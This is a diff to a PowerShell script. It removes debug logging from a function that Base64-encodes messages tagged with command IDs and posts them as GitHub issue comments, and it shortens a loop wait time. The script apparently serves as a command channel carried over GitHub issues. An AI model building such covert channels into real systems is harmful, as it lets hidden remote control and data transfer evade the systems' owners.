@@ -30,12 +30,10 @@ function Send-Message
         #Default: encode the body
         Else
         {
-            Write-Console -Message ("body is currently set to " + $body)
+            #Unable to determine why comments created using these variables have display issues on GitHub. Possibly a bug in PowerShellForGitHub?
             [string]$encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
-            Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
             $mergedBody = "[" + [string]$commandID + "]:" + [string]$encodedBody
-            Write-Console -Message ("Merged body is " + $mergedBody)
-            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ($mergedBody + "")
+            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
         }           
     }
     catch
@@ -482,7 +480,11 @@ function Start-LoopMode
         Write-Console -Message ("Wait time was set to " + $waitTime + " minutes.")
 
         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-        $waitTime = 2
+        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+        $waitTime = 1
         Write-Host "For debugging purposes the wait time has been set."
 
         try
